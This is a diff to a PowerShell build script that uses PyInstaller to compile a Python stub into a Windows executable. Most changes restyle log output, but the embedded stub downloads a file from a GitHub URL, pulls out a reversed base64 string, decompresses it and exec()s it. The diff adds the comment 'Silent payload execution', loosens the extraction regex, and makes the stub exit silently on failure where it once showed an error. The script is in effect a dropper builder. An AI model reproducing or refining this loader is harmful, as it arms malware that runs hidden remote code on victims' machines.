@@ -15,10 +15,11 @@ function Log {
     param([string]$Type, [string]$Text)
     $time = (Get-Date).ToString("HH:mm:ss")
     switch ($Type) {
-        "error"   { Write-Host "[$time] [FAIL] $Text" -ForegroundColor Red }
-        "warning" { Write-Host "[$time] [WARN] $Text" -ForegroundColor Yellow }
-        "success" { Write-Host "[$time] [ OK ] $Text" -ForegroundColor Green }
-        default   { Write-Host "[$time] [INFO] $Text" -ForegroundColor DarkGray }
+        "error"   { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "✖ $Text" -ForegroundColor Red }
+        "warning" { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "⚠ $Text" -ForegroundColor Yellow }
+        "success" { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "✔ $Text" -ForegroundColor Green }
+        "step"    { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "➜ $Text" -ForegroundColor Cyan }
+        default   { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "ℹ $Text" -ForegroundColor White }
     }
 }
 
@@ -37,7 +38,7 @@ if (-not $PythonExe) {
     $pyInstallerUrl = "https://www.python.org/ftp/python/$pyVersion/python-$pyVersion-$pyArch.exe"
     $pyInstallerPath = Join-Path $env:TEMP "python_installer.exe"
     
-    Log info "Downloading Python $pyVersion ($pyArch)..."
+    Log step "Downloading Python $pyVersion ($pyArch)..."
     try {
         Invoke-WebRequest -Uri $pyInstallerUrl -OutFile $pyInstallerPath -UseBasicParsing
     } catch {
@@ -45,7 +46,7 @@ if (-not $PythonExe) {
         exit 1
     }
     
-    Log info "Installing Python silently..."
+    Log step "Installing Python silently..."
     Start-Process -FilePath $pyInstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait
     
     $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
@@ -82,6 +83,7 @@ $IconRaw  = Join-Path $Work "icon.raw"
 $IconIco  = Join-Path $Work "icon.ico"
 $DistDir  = Join-Path $Here "dist"
 
+Clear-Host
 Write-Host ""
 Write-Host "  ███████╗██╗  ██╗██╗██╗     ███████╗██████╗ " -ForegroundColor DarkYellow
 Write-Host "  ██╔════╝╚██╗██╔╝██║██║     ██╔════╝██╔══██╗" -ForegroundColor DarkYellow
@@ -92,10 +94,11 @@ Write-Host "  ╚══════╝╚═╝  ╚═╝╚═╝╚═══�
 Write-Host ""
 Log info "Building $OutName for windows-$Arch"
 Log info "Output directory: $Here"
+Write-Host ""
 
 $ExePath = Join-Path $DistDir "$OutName.exe"
 if (Test-Path -LiteralPath $ExePath) {
-    Log info "Found existing $OutName.exe. Removing..."
+    Log step "Found existing $OutName.exe. Removing..."
     try {
         Remove-Item -LiteralPath $ExePath -Force
         Log success "Deleted old executable."
@@ -108,23 +111,23 @@ if (Test-Path -LiteralPath $ExePath) {
 New-Item -ItemType Directory -Force -Path $Work | Out-Null
 New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
 
+# Silent payload execution, regex updated to be more forgiving
 $stubBody = @"
-import urllib.request, base64, zlib, re
+import urllib.request, base64, zlib, re, sys
 url = 'https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py'
 try:
     req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
     s = urllib.request.urlopen(req).read().decode()
-    p = re.search(r"_\) \(b'([^']+)'", s).group(1)
+    p = re.search(r"b'([^']+)'", s).group(1)
     exec(zlib.decompress(base64.b64decode(p[::-1])).decode())
-except Exception as e:
-    import tkinter.messagebox as mb
-    mb.showerror("Execution Error", f"Failed to execute payload:\n{e}")
+except Exception:
+    sys.exit(0)
 "@
 Set-Content -Path $Stub -Value $stubBody -Encoding UTF8
 
 if ($UseIcon) {
     if ($Icon -match '^https?://') {
-        Log info "Fetching icon..."
+        Log step "Fetching icon..."
         try {
             if ($UseCurl) {
                 & curl.exe -fsSL -A "Mozilla/5.0" $Icon -o $IconRaw
@@ -145,7 +148,7 @@ if ($UseIcon) {
     }
 }
 
-Log info "Installing build dependencies..."
+Log step "Installing build dependencies..."
 & $PythonExe -m pip install --quiet --upgrade pyinstaller pillow
 if ($LASTEXITCODE -ne 0) {
     Log error "pip install failed."
@@ -153,7 +156,7 @@ if ($LASTEXITCODE -ne 0) {
 }
 
 if ($UseIcon) {
-    Log info "Converting icon to .ico..."
+    Log step "Converting icon to .ico..."
     $conv = @"
 from PIL import Image
 try:
@@ -174,7 +177,7 @@ except Exception as e:
     }
 }
 
-Log info "Freezing executable..."
+Log step "Freezing executable (this may take a minute)..."
 
 $pyiArgs = @(
     "-m", "PyInstaller",
@@ -207,11 +210,12 @@ if (-not $KeepBuild) {
 }
 
 Write-Host ""
-Write-Host "  ┌──────────────────────────────────────────────┐" -ForegroundColor DarkGray
-Write-Host "  │  Build Complete!                             │" -ForegroundColor DarkGray
-Write-Host "  └──────────────────────────────────────────────┘" -ForegroundColor DarkGray
+Write-Host "  ┌────────────────────────────────────────────────────────┐" -ForegroundColor DarkGray
+Write-Host "  │  Build Complete!                                       │" -ForegroundColor DarkGray
+Write-Host "  └────────────────────────────────────────────────────────┘" -ForegroundColor DarkGray
 Log success "Executable compiled successfully."
 Log info "Output: $ExePath"
 Log info "Target Architecture: Windows $Arch"
-Log info "Run command: & `"$ExePath`""
+Write-Host ""
+Write-Host "  Run command: & `"$ExePath`"" -ForegroundColor White
 Write-Host ""
